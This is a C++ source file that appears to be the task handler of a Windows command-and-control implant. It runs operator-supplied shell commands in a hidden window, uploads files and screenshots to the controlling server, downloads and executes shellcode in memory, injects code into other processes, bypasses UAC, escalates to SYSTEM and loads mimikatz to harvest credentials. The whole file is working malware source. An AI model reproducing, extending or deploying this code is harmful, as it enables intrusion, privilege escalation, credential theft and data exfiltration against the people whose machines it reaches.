#include "task_manager.h"
#include "../core/config.h"
#include "../utils/encoding.h"
#include "../utils/system_info.h"
#include "../core/communication.h"

#include <windows.h>
#include <direct.h>
#include <tlhelp32.h>
#include <sstream>
#include <iomanip>
#include <iostream>

namespace Tasks {

    TaskResult TaskManager::ExecuteTask(const json& task) {
        try {
            if (!task.contains("type")) {
                return TaskResult(TaskStatus::FAILURE, "Task missing 'type' field");
            }

            int taskType = task["type"].get<int>();
            PRINTF("[DEBUG] Executing task type: %d\n", taskType);

            switch (static_cast<TaskType>(taskType)) {
                case TaskType::TERMINATE:
                    return ExecuteTerminate(task);
                case TaskType::SHELL:
                    return ExecuteShell(task);
                case TaskType::PWD:
                    return ExecutePwd(task);
                case TaskType::CD:
                    return ExecuteCd(task);
                case TaskType::WHOAMI:
                    return ExecuteWhoami(task);
                case TaskType::PS:
                    return ExecutePs(task);
                case TaskType::DOWNLOAD:
                    return ExecuteDownload(task);
                case TaskType::UPLOAD:
                    return ExecuteUpload(task);
                case TaskType::LISTPRIVS:
                    return ExecuteListPrivs(task);
                case TaskType::SETPRIV:
                    return ExecuteSetPriv(task);
                case TaskType::INJECT:
                    return ExecuteInject(task);
                case TaskType::BYPASSUAC:
                    return ExecuteBypassUAC(task);
                case TaskType::GETSYSTEM:
                    return ExecuteGetsystem(task);
                case TaskType::SCREENSHOT:
                    return ExecuteScreenshot(task);
                case TaskType::SLEEP:
                    return ExecuteSleep(task);
                case TaskType::MIMIKATZ:
                    return ExecuteMimikatz(task);
                default:
                    return TaskResult(TaskStatus::NOT_IMPLEMENTED, "Task type not recognized: " + std::to_string(taskType));
            }
        }
        catch (const std::exception& e) {
            PRINTF("[ERROR] Exception in ExecuteTask: %s\n", e.what());
            return TaskResult(TaskStatus::FAILURE, "Exception during task execution: " + std::string(e.what()));
        }
    }

    TaskResult TaskManager::ExecuteTerminate(const json& task) {
        PRINTF("[INFO] Terminating process\n");
        ExitProcess(0);
        return TaskResult(TaskStatus::SUCCESS, "Terminating"); // Never reached
    }

    TaskResult TaskManager::ExecuteShell(const json& task) {
        std::string input = "";
        if (task.contains("input")) {
            input = task["input"].get<std::string>();
        }

        if (input.empty()) {
            return TaskResult(TaskStatus::FAILURE, "No command provided");
        }

        std::string cmdOutput = ExecuteShellCommand(input);
        if (cmdOutput.find("Error:") != std::string::npos) {
            return TaskResult(TaskStatus::FAILURE, cmdOutput);
        }
        else {
            return TaskResult(TaskStatus::SUCCESS, cmdOutput);
        }
    }

    TaskResult TaskManager::ExecutePwd(const json& task) {
        char buffer[MAX_PATH];
        if (_getcwd(buffer, MAX_PATH)) {
            std::string result(buffer);
            PRINTF("[DEBUG] pwd result: %s\n", result.c_str());
            return TaskResult(TaskStatus::SUCCESS, result);
        }
        else {
            PRINTF("[DEBUG] _getcwd failed\n");
            return TaskResult(TaskStatus::FAILURE, "Failed to get current directory");
        }
    }

    TaskResult TaskManager::ExecuteCd(const json& task) {
        std::string input = "";
        if (task.contains("input")) {
            input = task["input"].get<std::string>();
        }

        if (input.empty()) {
            return TaskResult(TaskStatus::FAILURE, "No directory path provided");
        }

        if (SetCurrentDirectoryA(input.c_str())) {
            return TaskResult(TaskStatus::SUCCESS, "Changed directory to " + input);
        }
        else {
            return TaskResult(TaskStatus::FAILURE, "Failed to change directory to " + input);
        }
    }

    TaskResult TaskManager::ExecuteWhoami(const json& task) {
        std::string username = Utils::SystemInfo::GetUsername();
        return TaskResult(TaskStatus::SUCCESS, username);
    }

    TaskResult TaskManager::ExecutePs(const json& task) {
        std::stringstream ss;
        ss << std::setw(8) << "PID" << " " << std::setw(8) << "Parent" << " "
           << std::setw(6) << "Arch" << " " << std::setw(18) << "User" << " " << "Process Name" << "\n";
        ss << "-------------------------------------------------------------\n";

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            return TaskResult(TaskStatus::FAILURE, "Failed to create process snapshot");
        }

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (!Process32First(hSnapshot, &pe32)) {
            CloseHandle(hSnapshot);
            return TaskResult(TaskStatus::FAILURE, "Failed to retrieve first process");
        }

        do {
            DWORD pid = pe32.th32ProcessID;
            DWORD ppid = pe32.th32ParentProcessID;
            std::string procName = pe32.szExeFile;
            std::string arch = "N/A";
            
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            if (hProcess != NULL) {
                BOOL isWow64 = FALSE;
                typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
                LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
                    GetModuleHandleA("kernel32"), "IsWow64Process");
                if (fnIsWow64Process) {
                    if (fnIsWow64Process(hProcess, &isWow64))
                        arch = isWow64 ? "x86" : "x64";
                }
                CloseHandle(hProcess);
            }
            
            std::string user = "";
            ss << std::setw(8) << pid << " " << std::setw(8) << ppid << " " << std::setw(6) << arch << " "
               << std::setw(18) << user << " " << procName << "\n";
        } while (Process32Next(hSnapshot, &pe32));

        CloseHandle(hSnapshot);
        return TaskResult(TaskStatus::SUCCESS, ss.str());
    }

    TaskResult TaskManager::ExecuteDownload(const json& task) {
        if (!task.contains("file_id")) {
            return TaskResult(TaskStatus::FAILURE, "Download task missing file_id.");
        }

        std::string dest_path = "";
        if (task.contains("input")) {
            dest_path = task["input"].get<std::string>();
        }

        if (dest_path.empty()) {
            return TaskResult(TaskStatus::FAILURE, "No destination path provided");
        }

        std::string file_data = DownloadFilePayload(task);
        if (file_data.empty()) {
            return TaskResult(TaskStatus::FAILURE, "Failed to download file data.");
        }

        FILE* fp = fopen(dest_path.c_str(), "wb");
        if (fp == nullptr) {
            return TaskResult(TaskStatus::FAILURE, "Failed to open file for writing: " + dest_path);
        }

        fwrite(file_data.data(), 1, file_data.size(), fp);
        fclose(fp);
        return TaskResult(TaskStatus::SUCCESS, "File downloaded successfully to " + dest_path);
    }

    TaskResult TaskManager::ExecuteUpload(const json& task) {
        std::string file_path = "";
        if (task.contains("input")) {
            file_path = task["input"].get<std::string>();
        }

        if (file_path.empty()) {
            return TaskResult(TaskStatus::FAILURE, "No file path provided");
        }

        std::string outputMessage;
        bool success = UploadFile(task["id"].get<std::string>(), file_path, outputMessage);
        return TaskResult(success ? TaskStatus::SUCCESS : TaskStatus::FAILURE, outputMessage);
    }

    TaskResult TaskManager::ExecuteListPrivs(const json& task) {
        std::string shellcode = DownloadFilePayload(task);
        if (shellcode.empty()) {
            return TaskResult(TaskStatus::FAILURE, "Failed to download listprivs shellcode.");
        }

        // Create pipes to capture output
        HANDLE readPipe, writePipe;
        SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
        if (!CreatePipe(&readPipe, &writePipe, &saAttr, 0)) {
            return TaskResult(TaskStatus::FAILURE, "Failed to create pipe for listprivs.");
        }

        HANDLE hOldStdout = GetStdHandle(STD_OUTPUT_HANDLE);
        if (!SetStdHandle(STD_OUTPUT_HANDLE, writePipe)) {
            CloseHandle(readPipe);
            CloseHandle(writePipe);
            return TaskResult(TaskStatus::FAILURE, "Failed to redirect stdout.");
        }

        bool execSuccess = ExecuteSetPrivShellcode((char*)shellcode.data(), shellcode.size());

        // Close write end and read output
        CloseHandle(writePipe);
        SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);

        DWORD bytesRead;
        char buffer[4096];
        std::string shellOutput;
        while (ReadFile(readPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
            shellOutput.append(buffer, bytesRead);
        }
        CloseHandle(readPipe);

        if (execSuccess) {
            return TaskResult(TaskStatus::SUCCESS, shellOutput);
        }
        else {
            return TaskResult(TaskStatus::FAILURE, "Listpriv shellcode execution failed.");
        }
    }

    TaskResult TaskManager::ExecuteSetPriv(const json& task) {
        std::string shellcode = DownloadFilePayload(task);
        if (shellcode.empty()) {
            return TaskResult(TaskStatus::FAILURE, "Failed to download setpriv shellcode.");
        }

        bool execSuccess = ExecuteSetPrivShellcode((char*)shellcode.data(), shellcode.size());
        if (execSuccess) {
            return TaskResult(TaskStatus::SUCCESS, "");
        }
        else {
            return TaskResult(TaskStatus::FAILURE, "Setpriv shellcode execution failed.");
        }
    }

    TaskResult TaskManager::ExecuteInject(const json& task) {
        if (!task.contains("file_id")) {
            return TaskResult(TaskStatus::FAILURE, "No shellcode provided.");
        }

        std::string input = "";
        if (task.contains("input")) {
            input = task["input"].get<std::string>();
        }

        int targetPid = 0;
        try {
            targetPid = std::stoi(input);
        }
        catch (...) {
            return TaskResult(TaskStatus::FAILURE, "Invalid PID provided: " + input);
        }

        HANDLE hTarget = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                   PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, targetPid);
        if (!hTarget) {
            return TaskResult(TaskStatus::INJECTION_FAILED, 
                            "Failed to open target process. Error: " + std::to_string(GetLastError()));
        }

        std::string shellcode_payload = DownloadFilePayload(task);
        if (shellcode_payload.empty()) {
            CloseHandle(hTarget);
            return TaskResult(TaskStatus::FAILURE, "Failed to download shellcode payload.");
        }

        int injectStatus = Inject_CreateRemoteThread(hTarget, (PVOID)shellcode_payload.c_str(), shellcode_payload.size());
        CloseHandle(hTarget);

        if (injectStatus == 0) {
            return TaskResult(TaskStatus::SUCCESS, "");
        }
        else {
            return TaskResult(TaskStatus::INJECTION_FAILED, "Remote injection failed.");
        }
    }

    TaskResult TaskManager::ExecuteBypassUAC(const json& task) {
        std::string inputStr = "";
        if (task.contains("input")) {
            inputStr = task["input"].get<std::string>();
        }

        std::istringstream iss(inputStr);
        std::string method;
        iss >> method;
        nlohmann::json j;

        if (method != "1") {
            j["output"] = "Error: Only method 1 (fodhelper) is supported for bypassuac.";
            return TaskResult(TaskStatus::FAILURE, Utils::Encoding::base64_encode(j.dump()));
        }

        std::string cmd;
        std::getline(iss, cmd);
        if (!cmd.empty() && cmd[0] == ' ')
            cmd.erase(0, 1);

        const char* dllPath = "modules\\bypassuac_fodhelper_x64.dll";
        HMODULE hDll = LoadLibraryA(dllPath);
        if (!hDll) {
            j["output"] = "Failed to load DLL: " + std::string(dllPath);
            return TaskResult(TaskStatus::FAILURE, Utils::Encoding::base64_encode(j.dump()));
        }

        typedef LPWSTR(*BypassUACFunc)(LPCWSTR, DWORD);
        BypassUACFunc bypassFunc = (BypassUACFunc)GetProcAddress(hDll, "ExecuteW");
        if (!bypassFunc) {
            j["output"] = "Failed to get function ExecuteW from DLL.";
            FreeLibrary(hDll);
            return TaskResult(TaskStatus::FAILURE, Utils::Encoding::base64_encode(j.dump()));
        }

        int size_needed = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, NULL, 0);
        std::wstring wCommand(size_needed, 0);
        MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, &wCommand[0], size_needed);

        LPWSTR pBypassResult = bypassFunc(wCommand.c_str(), (DWORD)(wCommand.length() + 1));
        if (pBypassResult != NULL) {
            j["output"] = "BypassUAC executed successfully.";
            delete[] pBypassResult;
            FreeLibrary(hDll);
            return TaskResult(TaskStatus::SUCCESS, Utils::Encoding::base64_encode(j.dump()));
        }
        else {
            j["output"] = "BypassUAC failed.";
            FreeLibrary(hDll);
            return TaskResult(TaskStatus::FAILURE, Utils::Encoding::base64_encode(j.dump()));
        }
    }

    TaskResult TaskManager::ExecuteGetsystem(const json& task) {
        std::string input = "";
        if (task.contains("input")) {
            input = task["input"].get<std::string>();
        }

        std::istringstream iss(input);
        std::string method;
        iss >> method;

        if (method != "1") {
            return TaskResult(TaskStatus::FAILURE, "Error: Only method 1 (pipe) is supported for getsystem.");
        }

        std::string cmd;
        std::getline(iss, cmd);
        if (!cmd.empty() && cmd[0] == ' ')
            cmd.erase(0, 1);

        const char* dllPath = "modules\\getsystem_pipe_x64.dll";
        HMODULE hDll = LoadLibraryA(dllPath);
        if (!hDll) {
            return TaskResult(TaskStatus::FAILURE, "Failed to load DLL: " + std::string(dllPath));
        }

        typedef LPWSTR(*ExecuteWFunc)(LPCWSTR, DWORD);
        ExecuteWFunc ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "ExecuteW");
        if (!ExecuteW) {
            FreeLibrary(hDll);
            return TaskResult(TaskStatus::FAILURE, "Failed to get function ExecuteW from DLL.");
        }

        std::wstring wCmd(cmd.begin(), cmd.end());
        LPWSTR wResult = ExecuteW(wCmd.c_str(), static_cast<DWORD>(wCmd.size() + 1));
        
        TaskResult result;
        if (wResult && wResult[0] == L'1') {
            result = TaskResult(TaskStatus::SUCCESS, "Getsystem executed successfully.");
        }
        else {
            result = TaskResult(TaskStatus::FAILURE, "Getsystem failed.");
        }
        
        FreeLibrary(hDll);
        return result;
    }

    TaskResult TaskManager::ExecuteScreenshot(const json& task) {
        const char* dllPath = "modules\\screenshot_x64.dll";
        HMODULE hScreenshot = LoadLibraryA(dllPath);
        if (!hScreenshot) {
            return TaskResult(TaskStatus::FAILURE, "Failed to load screenshot module from path: " + std::string(dllPath));
        }

        typedef int(*pExecuteW)(char**, int*);
        pExecuteW ScreenshotFunc = (pExecuteW)GetProcAddress(hScreenshot, "ExecuteW");
        if (!ScreenshotFunc) {
            FreeLibrary(hScreenshot);
            return TaskResult(TaskStatus::FAILURE, "Failed to locate ExecuteW in screenshot module.");
        }

        char* base64Screenshot = nullptr;
        int dataSize = 0;
        int ret = ScreenshotFunc(&base64Screenshot, &dataSize);

        if (ret != 0 || base64Screenshot == nullptr || dataSize <= 0) {
            FreeLibrary(hScreenshot);
            return TaskResult(TaskStatus::FAILURE, "Screenshot function failed.");
        }

        std::string b64Screenshot(base64Screenshot, dataSize);
        PRINTF("[DEBUG] Base64 Screenshot (first 50 chars): %.50s\n", b64Screenshot.c_str());

        typedef void(*pFreeScreenshotMem)(void*);
        pFreeScreenshotMem pFreeMem = (pFreeScreenshotMem)GetProcAddress(hScreenshot, "FreeScreenshotMemory");
        if (pFreeMem) {
            pFreeMem(base64Screenshot);
        }
        FreeLibrary(hScreenshot);

        std::string pngData = Utils::Encoding::base64_decode(b64Screenshot);
        if (pngData.empty()) {
            return TaskResult(TaskStatus::FAILURE, "Failed to decode screenshot data.");
        }

        std::string taskId = task["id"].get<std::string>();
        std::string tempFilePath = "temp_screenshot_" + taskId + ".png";
        FILE* fp = fopen(tempFilePath.c_str(), "wb");
        if (!fp) {
            return TaskResult(TaskStatus::FAILURE, "Failed to open temporary file for screenshot upload.");
        }

        size_t written = fwrite(pngData.data(), 1, pngData.size(), fp);
        fclose(fp);

        if (written != pngData.size()) {
            return TaskResult(TaskStatus::FAILURE, "Error writing complete screenshot data to temporary file.");
        }

        std::string outputMessage;
        bool success = UploadFile(taskId, tempFilePath, outputMessage);
        remove(tempFilePath.c_str());

        return TaskResult(success ? TaskStatus::SUCCESS : TaskStatus::FAILURE, outputMessage);
    }

    TaskResult TaskManager::ExecuteSleep(const json& task) {
        std::string input = "";
        if (task.contains("input")) {
            input = task["input"].get<std::string>();
        }

        std::istringstream iss(input);
        int newSleepTime, newJitterMax, newJitterMin = 25;
        
        if (!(iss >> newSleepTime >> newJitterMax)) {
            return TaskResult(TaskStatus::FAILURE, "Invalid parameters for sleep command.");
        }
        
        if (!(iss >> newJitterMin)) {
            newJitterMin = 25;
        }
        
        if (newJitterMax < newJitterMin) {
            newJitterMin = 0;
        }

        Config::Sleep::UpdateConfig(newSleepTime, newJitterMax, newJitterMin);

        std::ostringstream oss;
        oss << "Sleep configuration updated: " << newSleepTime << " seconds, jitter_max: "
            << newJitterMax << "%, jitter_min: " << newJitterMin << "%";
        
        return TaskResult(TaskStatus::SUCCESS, oss.str());
    }

    TaskResult TaskManager::ExecuteMimikatz(const json& task) {
        std::string args = "";
        if (task.contains("input")) {
            args = task["input"].get<std::string>();
        }

        if (args.empty()) {
            return TaskResult(TaskStatus::FAILURE, "Usage: mimikatz \"mod::cmd1;mod::cmd2;...\"");
        }

        // Create pipes to capture standard output
        HANDLE hReadPipe, hWritePipe;
        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

        if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
            return TaskResult(TaskStatus::FAILURE, "Failed to create pipes for output redirection");
        }

        HANDLE hOldStdout = GetStdHandle(STD_OUTPUT_HANDLE);
        if (!SetStdHandle(STD_OUTPUT_HANDLE, hWritePipe)) {
            CloseHandle(hReadPipe);
            CloseHandle(hWritePipe);
            return TaskResult(TaskStatus::FAILURE, "Failed to redirect stdout");
        }

        const char* dllPath = "modules\\mimikatz_x64.dll";
        HMODULE hDll = LoadLibraryA(dllPath);
        if (!hDll) {
            SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
            CloseHandle(hReadPipe);
            CloseHandle(hWritePipe);
            return TaskResult(TaskStatus::FAILURE, std::string("Failed to load DLL: ") + dllPath);
        }

        typedef LPWSTR(*ExecuteWFunc)(LPWSTR);
        ExecuteWFunc ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "ExecuteW");

        if (!ExecuteW) {
            ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "_ExecuteW");
            if (!ExecuteW) {
                ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "Invoke");
                if (!ExecuteW) {
                    SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
                    CloseHandle(hReadPipe);
                    CloseHandle(hWritePipe);
                    FreeLibrary(hDll);
                    return TaskResult(TaskStatus::FAILURE, "Failed to locate any expected function in mimikatz module.");
                }
            }
        }

        // Get optional Init/Cleanup functions
        typedef void (WINAPI *InitFunc)();
        typedef void (WINAPI *CleanupFunc)();
        InitFunc Init = (InitFunc)GetProcAddress(hDll, "Init");
        CleanupFunc Cleanup = (CleanupFunc)GetProcAddress(hDll, "Cleanup");

        if (Init) {
            Init();
        }

        int wlen = MultiByteToWideChar(CP_UTF8, 0, args.c_str(), -1, NULL, 0);
        std::wstring wArgs(wlen, 0);
        MultiByteToWideChar(CP_UTF8, 0, args.c_str(), -1, &wArgs[0], wlen);

        LPWSTR wOut = ExecuteW(const_cast<LPWSTR>(wArgs.c_str()));

        if (Cleanup) {
            Cleanup();
        }

        CloseHandle(hWritePipe);

        std::string capturedOutput;
        char buffer[4096];
        DWORD bytesRead;

        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            capturedOutput += buffer;
        }

        SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
        CloseHandle(hReadPipe);

        TaskResult result;
        if (!capturedOutput.empty()) {
            result = TaskResult(TaskStatus::SUCCESS, capturedOutput);
        }
        else if (wOut) {
            int outLen = WideCharToMultiByte(CP_UTF8, 0, wOut, -1, NULL, 0, NULL, NULL);
            std::string outBuf(outLen, 0);
            WideCharToMultiByte(CP_UTF8, 0, wOut, -1, &outBuf[0], outLen, NULL, NULL);
            result = TaskResult(TaskStatus::SUCCESS, outBuf);
            delete[] wOut;
        }
        else {
            result = TaskResult(TaskStatus::FAILURE, "Mimikatz execution failed - no output captured.");
        }

        FreeLibrary(hDll);
        return result;
    }

    // Helper function implementations
    std::string TaskManager::ExecuteShellCommand(const std::string& command) {
        HANDLE hStdInPipeRead = NULL;
        HANDLE hStdInPipeWrite = NULL;
        HANDLE hStdOutPipeRead = NULL;
        HANDLE hStdOutPipeWrite = NULL;
        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

        if (!CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0)) {
            PRINTF("[DEBUG] Error: Failed to create STDIN pipe. Error: %d\n", GetLastError());
            return "Error: Failed to create STDIN pipe.";
        }
        if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0)) {
            PRINTF("[DEBUG] Error: Failed to create STDOUT pipe. Error: %d\n", GetLastError());
            CloseHandle(hStdInPipeRead);
            CloseHandle(hStdInPipeWrite);
            return "Error: Failed to create STDOUT pipe.";
        }

        STARTUPINFOW si = { 0 };
        si.cb = sizeof(STARTUPINFO);
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;
        si.hStdError = hStdOutPipeWrite;
        si.hStdOutput = hStdOutPipeWrite;
        si.hStdInput = hStdInPipeRead;

        PROCESS_INFORMATION pi = { 0 };
        std::wstring wCommandLine = L"cmd.exe /c " + StringToWString(command);
        
        PRINTF("[DEBUG] Executing command: %s\n", command.c_str());

        if (!CreateProcessW(NULL, (LPWSTR)wCommandLine.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            PRINTF("[DEBUG] Error: Failed to create process. Error: %d\n", GetLastError());
            CloseHandle(hStdInPipeRead);
            CloseHandle(hStdInPipeWrite);
            CloseHandle(hStdOutPipeRead);
            CloseHandle(hStdOutPipeWrite);
            return "Error: Failed to create process.";
        }

        if (WaitForSingleObject(pi.hProcess, 10000) == WAIT_TIMEOUT) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(hStdOutPipeWrite);
            CloseHandle(hStdInPipeRead);
            CloseHandle(hStdInPipeWrite);
            CloseHandle(hStdOutPipeRead);
            return "Error: Process timed out.";
        }

        CloseHandle(hStdOutPipeWrite);
        CloseHandle(hStdInPipeRead);

        std::string output;
        const DWORD BUFSIZE = 1024;
        char buffer[BUFSIZE + 1] = { 0 };
        DWORD dwRead = 0;
        
        while (ReadFile(hStdOutPipeRead, buffer, BUFSIZE, &dwRead, NULL) && dwRead > 0) {
            buffer[dwRead] = '\0';
            output.append(buffer);
        }

        CloseHandle(hStdOutPipeRead);
        CloseHandle(hStdInPipeWrite);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return output;
    }

    bool TaskManager::ExecuteSetPrivShellcode(char* shellcode, size_t shellcodeSize) {
        void* execMemory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (execMemory == NULL) {
            return false;
        }

        memcpy(execMemory, shellcode, shellcodeSize);

        DWORD oldProtect;
        if (!VirtualProtect(execMemory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
            VirtualFree(execMemory, 0, MEM_RELEASE);
            return false;
        }

        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMemory, NULL, 0, NULL);
        if (hThread == NULL) {
            VirtualFree(execMemory, 0, MEM_RELEASE);
            return false;
        }

        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return true;
    }

    std::wstring TaskManager::StringToWString(const std::string& s) {
        int len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), -1, NULL, 0);
        std::wstring ws(len, L'\0');
        MultiByteToWideChar(CP_ACP, 0, s.c_str(), -1, &ws[0], len);
        if (!ws.empty() && ws.back() == L'\0')
            ws.pop_back();
        return ws;
    }

    std::string TaskManager::DownloadFilePayload(const json& task) {
        std::string file_id = task["file_id"].get<std::string>();
        std::string task_id = task["id"].get<std::string>();

        json requestData = {
            {"agent_id", Config::Agent::GetId()},
            {"task_id", task_id},
            {"file_id", file_id},
            {"ht", 7}  // DownloadStart
        };

        json downloadResponse;
        if (!Core::Communication::SendEncryptedRequest(requestData, downloadResponse))
            return "";

        std::string payload = "";
        if (downloadResponse.contains("chunk")) {
            std::string chunk_encoded = downloadResponse["chunk"].get<std::string>();
            payload += Utils::Encoding::base64_decode(chunk_encoded);
        }
        
        int next_chunk_id = 0;
        if (downloadResponse.contains("next_chunk_id"))
            next_chunk_id = downloadResponse["next_chunk_id"].get<int>();

        while (next_chunk_id != 0) {
            json chunkRequestData = {
                {"file_id", file_id},
                {"chunk_id", next_chunk_id},
                {"ht", 8}
            };

            json chunkDownloadResponse;
            if (!Core::Communication::SendEncryptedRequest(chunkRequestData, chunkDownloadResponse))
                break;

            if (chunkDownloadResponse.contains("chunk")) {
                std::string chunk_encoded = chunkDownloadResponse["chunk"].get<std::string>();
                payload += Utils::Encoding::base64_decode(chunk_encoded);
            }
            
            if (chunkDownloadResponse.contains("next_chunk_id"))
                next_chunk_id = chunkDownloadResponse["next_chunk_id"].get<int>();
            else
                next_chunk_id = 0;
        }
        return payload;
    }

    bool TaskManager::UploadFile(const std::string& taskId, const std::string& filePath, std::string& outputMessage) {
        FILE* fp = fopen(filePath.c_str(), "rb");
        if (!fp) {
            outputMessage = "Failed to open file: " + filePath;
            return false;
        }

        fseek(fp, 0, SEEK_END);
        long fileSize = ftell(fp);
        fseek(fp, 0, SEEK_SET);

        size_t pos = filePath.find_last_of("\\/");
        std::string fileName = (pos != std::string::npos) ? filePath.substr(pos + 1) : filePath;

        json startData = {
            {"agent_id", Config::Agent::GetId()},
            {"task_id", taskId},
            {"file_name", fileName},
            {"file_size", fileSize},
            {"path", filePath},
            {"content", ""},
        };

        std::string encoded_data = Utils::Encoding::base64_encode(startData.dump());
        json outerStartData = {
            {"data", encoded_data},
            {"ht", 4}  // UploadStart
        };

        json startResponse;
        if (!Core::Communication::SendEncryptedRequest(outerStartData, startResponse)) {
            outputMessage = "UploadStart failed (HTTP error).";
            fclose(fp);
            return false;
        }

        std::string file_id;
        if (startResponse.contains("id")) {
            file_id = startResponse["id"].get<std::string>();
        }
        else {
            outputMessage = "No file ID returned from UploadStart.";
            fclose(fp);
            return false;
        }

        const size_t CHUNK_SIZE = 4096;
        int chunk_id = 0;
        bool success = true;

        while (!feof(fp) && success) {
            char buffer[CHUNK_SIZE];
            size_t bytesRead = fread(buffer, 1, CHUNK_SIZE, fp);
            if (bytesRead > 0) {
                std::string chunkDataStr(buffer, bytesRead);
                std::string encodedChunk = Utils::Encoding::base64_encode(chunkDataStr);

                json chunkData = {
                    {"task_id", taskId},
                    {"chunk_id", chunk_id},
                    {"content", encodedChunk},
                    {"file_id", file_id}
                };

                std::string encoded_chunk_data = Utils::Encoding::base64_encode(chunkData.dump());
                json outerChunkData = {
                    {"data", encoded_chunk_data},
                    {"ht", 5}  // UploadChunk
                };

                json chunkResponse;
                if (!Core::Communication::SendEncryptedRequest(outerChunkData, chunkResponse)) {
                    outputMessage = "UploadChunk failed at chunk " + std::to_string(chunk_id);
                    success = false;
                    break;
                }
                chunk_id++;
            }
        }

        fclose(fp);
        if (!success) return false;

        json endData = {
            {"agent_id", Config::Agent::GetId()},
            {"task_id", taskId},
            {"status", 4},
            {"result", ""},
            {"file_id", file_id}
        };

        std::string encoded_end_data = Utils::Encoding::base64_encode(endData.dump());
        json outerEndData = {
            {"data", encoded_end_data},
            {"ht", 6}  // UploadEnd
        };

        json endResponse;
        if (!Core::Communication::SendEncryptedRequest(outerEndData, endResponse)) {
            outputMessage = "UploadEnd failed (HTTP error).";
            return false;
        }

        outputMessage = "File uploaded successfully: " + fileName;
        return true;
    }

    int TaskManager::Inject_CreateRemoteThread(HANDLE hProc, PVOID payload, SIZE_T payload_len) {
        LPVOID pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pRemoteCode) {
            PRINTF("VirtualAllocEx failed: %d\n", GetLastError());
            return -1;
        }
        
        if (!WriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL)) {
            PRINTF("WriteProcessMemory failed: %d\n", GetLastError());
            VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
            return -1;
        }
        
        DWORD dummy;
        if (!VirtualProtectEx(hProc, pRemoteCode, payload_len, PAGE_EXECUTE_READ, &dummy)) {
            PRINTF("VirtualProtectEx failed: %d\n", GetLastError());
            VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
            return -1;
        }
        
        HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
        if (hThread == NULL) {
            PRINTF("CreateRemoteThread failed: %d\n", GetLastError());
            VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
            return -1;
        }
        
        WaitForSingleObject(hThread, 2000);
        CloseHandle(hThread);
        VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
        return 0;
    }

} // namespace Tasks